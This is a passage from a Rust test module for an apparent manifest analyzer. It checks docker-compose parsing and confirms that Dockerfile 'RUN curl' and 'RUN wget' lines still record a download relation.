        let findings = analyze_docker_compose(path, good);
        assert!(
            !finding_present(&findings, "MANIFEST_DOCKER_COMPOSE_PARSE_FAILURE"),
            "valid YAML must not produce a parse-failure finding; got {findings:?}",
        );
    }

    /// Contract: regression guard for the original `curl`/`wget` coverage.
    /// The fix must NOT drop the cases that already worked.
    #[test]
    fn dockerfile_relations_still_records_curl_and_wget() {
        for token in ["RUN curl https://x\n", "RUN wget https://x\n"] {
            let content = format!("FROM alpine\n{token}");
            let links = dockerfile_relations(&content);
            assert!(
                links
                    .iter()
                    .any(|l| matches!(l.relation, ArtifactRelation::Downloads)),
                "`{token}` must keep producing a Downloads edge; got {links:?}",
            );
        }
    }
}
